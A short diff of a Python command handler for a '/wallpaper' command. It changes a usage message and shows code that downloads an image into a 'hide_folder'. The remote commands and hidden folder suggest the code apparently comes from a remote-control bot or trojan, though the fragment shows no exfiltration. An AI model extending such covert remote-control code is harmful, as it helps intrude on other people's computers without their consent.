@@ -500,7 +500,7 @@ def handle(msg):
 				command = command.replace('/wallpaper', '')
 				command = command.strip()
 				if len(command) == 0:
-					response = 'Usage: /wallpaper C:/Users/User/Desktop/porn.jpg'
+					response = 'Usage: /wallpaper <image path>or /wallpaper <URL>'
 				elif command.startswith('http'):
 					image = command.rsplit('/',1)[1]
 					image = hide_folder + '/' + image
